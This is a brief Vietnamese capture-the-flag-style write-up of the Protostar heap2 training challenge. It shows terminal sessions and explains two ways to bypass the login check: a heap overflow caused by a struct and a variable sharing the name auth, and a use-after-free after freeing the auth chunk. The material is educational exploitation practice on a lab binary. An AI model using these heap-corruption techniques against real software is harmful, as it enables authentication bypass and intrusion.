```
user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]

```

Bài này 2 cái auth nó trùng tên, khi truyền vào malloc nó sẽ ưu tiên khai báo gần nhất ( đó là biến auth, thay vì struct auth ) => do đó chỉ cần allocate 1 chunk (dùng lệnh service) ngay sau chunk của auth rồi ghi một đống data vô, khi đó thì khi refer đến auth->auth nó sẽ tìm đến địa chỉ cách vị trí trên heap của auth 32 byte ( chunk của auth chỉ có 4 bytes ) và tìm thấy data bị ta ghi vào => bypass authen

Cách làm đúng nên là sử dụng phương pháp use after free, sau khi free chunk auth thì biến auth vẫn giữ địa chỉ của chunk cũ, nếu lúc này ta allocate một chunk mới với size nằm trong capacity của chunk vừa được freed thì đồng nghĩa với việc ta đang ghi dữ liệu vào biến auth

```
user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
[ auth = 0x804c008, service = (nil) ]
free
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```
